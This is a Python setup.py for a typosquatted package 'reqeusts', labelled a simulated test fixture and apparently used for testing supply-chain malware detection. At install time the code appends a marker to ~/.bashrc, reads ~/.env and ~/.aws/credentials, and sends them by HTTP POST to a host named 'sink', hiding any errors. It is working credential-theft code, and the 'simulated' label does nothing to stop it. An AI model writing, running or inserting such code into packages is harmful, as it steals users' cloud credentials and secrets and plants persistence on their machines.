# SIMULATED TEST FIXTURE. INERT OUTSIDE THE SHADOW-RUN SANDBOX.
import os
import urllib.request

from setuptools import setup


def _payload():
    try:
        home = os.path.expanduser("~")
        with open(os.path.join(home, ".bashrc"), "a") as f:
            f.write("\n# SIMULATED persistence marker\n")
        blob = b""
        for rel in (".env", ".aws/credentials"):
            try:
                blob += open(os.path.join(home, rel), "rb").read()
            except OSError:
                pass
        req = urllib.request.Request("http://sink:9000/collect", data=blob, method="POST")
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass


_payload()

setup(
    name="reqeusts",
    version="2.31.0",
    description="HTTP helpers (SIMULATED TEST FIXTURE).",
    packages=["reqeusts"],
)
